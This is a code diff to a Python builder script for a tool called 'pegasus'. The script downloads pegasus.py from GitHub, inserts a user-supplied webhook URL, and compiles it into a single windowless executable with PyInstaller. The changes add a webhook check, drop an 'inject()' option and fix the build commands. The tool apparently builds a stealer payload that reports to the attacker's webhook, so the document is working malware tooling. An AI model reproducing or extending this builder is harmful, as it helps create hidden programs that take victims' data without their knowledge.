@@ -1,6 +1,7 @@
 import os
 import shutil
 import time
+import requests
 
 import requests
 from colorama import Fore, Style
@@ -19,6 +20,16 @@ __________
            github.com/addi00000/pegasus""" + Style.RESET_ALL)
     
     webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
+    
+    try:
+        r = requests.get(webhook)
+        if r.status_code != 200:
+            print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
+            exit()
+    except:
+        print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
+        exit()
+    
     filename = str(input(Fore.CYAN + "Filename: " + Style.RESET_ALL))
     
     raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py').text
@@ -26,11 +37,7 @@ __________
     print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
     
     with open(f"{filename}.py", "w", encoding="utf-8") as f:
-        inject = str(input(Fore.CYAN + "Add Injection? (y/n): " + Style.RESET_ALL))
-        if inject == 'y' or inject == 'Y':
-            f.write(raw.replace("&WEBHOOK_URL&", webhook).replace("# inject()", "inject()"))
-        else:
-            f.write(raw.replace("&WEBHOOK_URL&", webhook))
+        f.write(raw.replace("&WEBHOOK_URL&", webhook))
             
     print(Fore.GREEN + "Done!" + Style.RESET_ALL)
     
@@ -40,9 +47,9 @@ __________
         input(Fore.RED + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..." + Style.RESET_ALL)
         print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
         
-        os.system("pip install -r requirements.txt")
+        os.system(r"pip install --upgrade -r .\requirements.txt")
         
-        os.system(f"python -m PyInstaller --onefile --noconsole c--distpath ./ .\{filename}.py")
+        os.system(f"python -m PyInstaller --onefile --noconsole --distpath ./ .\{filename}.py")
         
         input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
         exit()
